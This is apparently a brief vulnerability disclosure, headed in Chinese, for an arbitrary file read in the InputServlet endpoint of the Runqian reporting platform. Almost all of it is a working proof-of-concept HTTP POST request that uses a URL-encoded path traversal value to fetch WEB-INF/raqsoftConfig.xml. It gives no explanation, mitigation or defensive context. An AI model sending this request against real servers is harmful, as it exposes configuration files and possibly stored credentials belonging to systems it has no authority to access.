## 润乾报表平台InputServlet存在任意文件读取漏洞


## poc
```
POST /InputServlet?action=13 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Content-Type: application/x-www-form-urlencoded
Connection: close
 
file=%2F%5C..%5C%5C..%5C%5CWEB-INF%5C%5CraqsoftConfig.xml&upFileName=web.config

```
